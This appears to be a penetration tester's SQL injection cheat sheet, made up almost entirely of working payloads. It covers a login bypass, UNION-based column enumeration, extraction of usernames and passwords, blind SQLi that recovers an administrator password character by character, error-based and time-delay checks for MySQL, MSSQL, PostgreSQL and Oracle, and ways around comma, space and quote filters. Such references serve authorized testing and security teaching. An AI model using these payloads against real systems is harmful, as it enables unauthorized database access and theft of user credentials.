### Basic authentication bypass
```
# Enter in the username field
' OR 1=1--
```
### Retrieving Database Version
```
# mysql / mariadb and Microsoft SQL
select @@version;

# postgreSQL
select version()

# oracle
select banner from v$version
select version from v$instance

```

### Determine the number of columns in a table
```
# INcrement order by one until an "out of range" error is received

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# If the number of NULLS does not match the number of columns, an error is received.
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
### Retrieving values to fields
```
# if the number of columns and values are the same
' UNION SELECT username,password from USERS--

# if the number of columns and values are different
# Example: 3 columns 2 values
' UNION SELECT username,password,null from USERS--
# Columns must support the result type (e.g.. string column can only hold a string value)
```
### Blind SQL

```
# Identify password length
'AND (SELECT 'a' from users WHERE username='administrator' AND LENGTH(password)>1)='a

# Identify one password character at a time
# This example depends on differences in the return data.
'AND (SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='administrator'),<character position>,1)))=<ascii decimal value>--
# For each substring character (1,1; then 2,1; 3,1; etc...) cycle through all the decimal values for printable characters (33-126)

# for oracle, use SUBSTR instead of SUBSTRING

#These conditional queries depend on triggering error messages.

#Oracle  
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual  

#Microsoft  
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END  

#PostgreSQL  
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END  

#Working PostgreSQL Statement 
(SELECT CASE WHEN count((SELECT(SELECT CASE WHEN count(( SELECT 1 ))<>0 THEN pg_sleep(5) ELSE $$$$ END)))<>0 THEN true ELSE false END) --

#MySQL  
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')  

```
### Retrieving multiple values in a single column (String Concatenation)
```
# oracle
' UNION SELECT username || '~' || password from USERS--
# Microsoft
` UNION SELECT username+password FROM USERS--

```
### Bypassing Comma Restrictions
```
SELECT 1,2,3,4 FROM TABLE;    UNION SELECT * from ((SELECT 1 FROM TABLE)a JOIN (SELECT 2 FROM TABLE)b JOIN (SELECT 3 FROM TABLE)c JOIN (SELECT 4 FROM TABLE)d)--
```
### Bypassing Space Restrictions  
```
# mysql
SELECT/**/1;

# postgreSQL
/**/

```
### Bypassing Quote Restrictions  
```
# postgres  
SELECT 'TEST'; # example
SELECT $$TEST$$;
SELECT $TAG$TEST$TAG$;
SELECT CHR(84) || CHR(69) || CHR (83)  || CHR (84);
```
# Time Delays
```
# mysql / mariadb 
sleep(10)

# Microsoft SQL 
WAITFOR DELAY '0:0:10'

# postgreSQL
SELECT pg_sleep(10)

# oracle
dbms_pipe.receive_message(('a'),10)
```

### SQLi Cheat Sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
[Blind SQLi example code](https://github.com/cyberheisen/Penetration-Testing-Notes/blob/main/development/python/custom_functions/bsqli.py)
